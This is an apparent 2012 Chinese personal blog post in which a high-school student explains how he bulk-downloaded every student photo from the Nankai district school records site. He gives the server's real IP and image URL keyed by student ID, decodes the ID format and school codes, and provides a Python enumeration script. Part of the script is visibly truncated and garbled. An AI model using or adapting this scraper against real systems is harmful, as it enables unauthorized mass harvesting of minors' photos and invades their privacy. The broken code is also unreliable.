title:获得天津市南开区所有学生的头像
date:2012-09-02-03-57
---
只要是天津南开区的高中生都要上南开教务网上传照片和个人信息的，不过我上的时候感觉这个网站做得很差，还是ASP.NET做的。

看了一下发现图片没有做保护，可以直接被下载，只是URL有一些特征而已。于是我就把全区学生的照片全下载了


图像的地址是http://113.31.29.215:8081/Default3.aspx?imageId=学籍号

（后来想要得到当今高一学生，发现他们还没有上传..）

![](http://beordle.com/wp-content/uploads/2012/09/800-1.jpeg)![](http://beordle.com/wp-content/uploads/2012/09/800-2.jpeg)![](http://beordle.com/wp-content/uploads/2012/09/800.jpeg)

学籍号的组成： 例如090504999这个学籍号，说明了他是09届，0504号学校的第999个学生。

其中3~6位号码与学校的关系是

```
0501 南开中学

0502 一零九中学

0503 崇化中学

0504 南大附中

0505 二十五中学

0506 第九中学

0507 育红中学

0508 天大附中

0509 南大附中（原附中）

0510 四十三中学

0511 津英中学

0512 南开艺术中学

0513 天津中学

0514 六十三中学

0515 南开翔宇学校

0518 南开光明中学

0519 南开外国语中学

0521 华泽高中

0525 七十四中学（民办）

0528 南开艺术中学（艺术班）

0531 静文中学

0532 崇化新疆班
```

例如说南大附中09届第999号学生的学籍号是090504999,而想要看他的照片的话，

URL是http://113.31.29.215:8081/Default3.aspx?imageId=090504999

当然,实际上这个人是不存在的.所以才没有图像. 为了解决大批量下载的问题，我编写了如下的Python代码：

```
#coding:utf-8
#beordle
import urllib2,os
schoolname='南开中学'
school={};school[schoolname]=range(90501001,90501999)
try :
  os.makedirs(schoolname)
except: pass
def tryview(url):
  for i in range(0,9):
    try:
      data=urllib2.urlopen(url).read()
      return data
    except:
      pass
  else:
    return 'DOCTYPE'
x=0

for i in school[schoolname]:
  print i
  pic='http://113.31.29.215:8081/Default3.aspx?imageId=0'+str(i)
  a=tryview(pic)
  a= a[:a.index('10:
    x+=1
    print '发现第'+str(x)+'个人'
    f=open(schoolname+'\\'+str(i)+".jpg","wb")
    f.write(a)
    f.close()
```

>后记：现在我已经毕业，这个是我刚高二时写的，不保证可用，可能网站已经挂了，就算没挂，也不是24小时开启的，只是每年特定的月份会开